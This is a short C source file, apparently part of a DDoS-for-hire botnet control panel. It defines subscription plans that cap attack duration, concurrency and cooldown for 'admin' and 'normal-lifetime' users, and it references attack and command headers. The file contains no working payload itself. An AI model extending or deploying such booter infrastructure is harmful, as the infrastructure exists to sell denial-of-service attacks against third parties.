#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <math.h>

#include "config.h"
#include "attacks.h"
#include "commands.h"

void make_plan(const char *name, const int cooldown, const int concurrent, const int attacktime)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(plan[i].name) == 0)
		{
			strcpy(plan[i].name, name);
			plan[i].cooldown = cooldown;
			plan[i].concurrent = concurrent;
			plan[i].attacktime = attacktime;
			break;
		}
	}
}

void add_plans()
{
	make_plan("admin", 0, 5, 300);
	make_plan("normal-lifetime", 5, 4, 120);
}
